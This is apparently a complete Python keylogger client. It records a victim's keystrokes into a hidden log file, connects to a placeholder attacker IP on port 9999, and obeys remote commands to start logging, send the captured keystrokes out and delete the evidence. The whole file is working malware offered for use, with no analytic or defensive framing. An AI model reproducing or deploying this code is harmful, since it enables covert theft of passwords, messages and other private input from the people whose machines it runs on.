import socket
import json
import threading
import re
import os
from pynput.keyboard import Listener

# --- Keylogger Class ---
class KeyLogger:
    def __init__(self):
        self.keys = []
        self.count = 0
        self.path = '.log_data.txt'
        self.listener = None

    def key_pressed(self, key):
        self.keys.append(key)
        self.count += 1

        if self.count >= 1:
            self.count = 0
            with open(self.path, 'a') as file:
                for i in self.keys:
                    i = re.sub("'", "", str(i))
                    if i == "Key.enter":
                        file.write("\n")
                    elif i in ("Key.shift", "Key.shift_r", "Key.ctrl", "Key.escape"):
                        pass
                    elif i == "Key.backspace":
                        file.write(" [backspace] ")
                    elif i == "Key.space":
                        file.write(" ")
                    elif i == "Key.tab":
                        file.write(" [Tab] ")
                    elif i == "Key.caps_lock":
                        file.write(" [Capslock] ")
                    else:
                        file.write(i)
            self.keys = []

    def start_listener(self):
        self.listener = Listener(on_press=self.key_pressed)
        self.listener.start()
        self.listener.join()

    def start_logger(self):
        self.t = threading.Thread(target=self.start_listener)
        self.t.start()

    def read_log(self):
        if os.path.exists(self.path):
            with open(self.path, 'r') as file:
                return file.read()
        return "Log file not found."

    def stop_listener(self):
        if self.listener:
            self.listener.stop()
            self.listener = None
        if os.path.exists(self.path):
            os.remove(self.path)

# --- Client Logic ---
sc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    sc.connect(('YOUR_ATTACKER_IP', 9999))  # Replace 'YOUR_ATTACKER_IP' with attacker's IP
except socket.error:
    exit()

keylogger = KeyLogger()

def receive_command():
    data = b''
    while True:
        try:
            part = sc.recv(1024)
            if not part:
                break
            data += part
            return json.loads(data.decode(errors='ignore'))
        except json.JSONDecodeError:
            continue
    return None

def send_log_to_attacker():
    log = keylogger.read_log()
    sc.send(log.encode())

def main():
    while True:
        command = receive_command()
        if not command:
            continue

        if command == 'start_logger':
            keylogger.start_logger()
        elif command == 'read_data':
            threading.Thread(target=send_log_to_attacker, daemon=True).start()
        elif command == 'stop_logger':
            keylogger.stop_listener()
        elif command in ('exit', 'quit'):
            break

main()
